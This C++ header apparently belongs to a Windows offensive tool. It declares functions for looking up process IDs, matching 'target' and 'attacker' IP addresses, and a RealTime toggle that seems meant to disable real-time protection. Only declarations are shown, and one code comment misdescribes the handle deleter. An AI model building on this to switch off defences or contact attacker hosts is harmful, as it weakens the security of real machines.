#pragma once
#define MAXIPV4_ADDRESS_SIZE 16  // 3 * 4 triple digit numbers + 3 dots + null terminator
#define MAX_PORT_SIZE 6  // 5 + null terminator
#define MAX_DEBUGKEY_SIZE 56  // 4 * up to 13 character chunks + 3 dots + null terminator

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <random>
#include <TlHelp32.h>
#include "utils.h"
#pragma comment(lib, "Ws2_32.lib")

typedef struct _RETURN_LAST {
	DWORD LastError;
	LSTATUS Represent;
} RETURN_LAST, * PRETURN_LAST;


// Get process handle -
struct GetHandle {  // iterates through possible handles 
    using pointer = HANDLE;
    void operator()(HANDLE Handle) const {
        if (Handle != NULL && Handle != INVALID_HANDLE_VALUE) {
            CloseHandle(Handle);  // take the first valid handle that comes up by closing it and using it after
        }
    }
};
using UniqueHndl = std::unique_ptr<HANDLE, GetHandle>;


std::uint32_t GetPID(std::string PrcName);
DWORD CompareIpAddresses(char* LocalHost, const char* RemoteAddr);
BOOL MatchIpAddresses(char* TargetAddress, char* AttackerAddress, const char* AttackerIps);
BOOL GetAddresses(char* Target, char* Attacker, const char* AttackAddresses);
RETURN_LAST RealTime(BOOL IsDisable);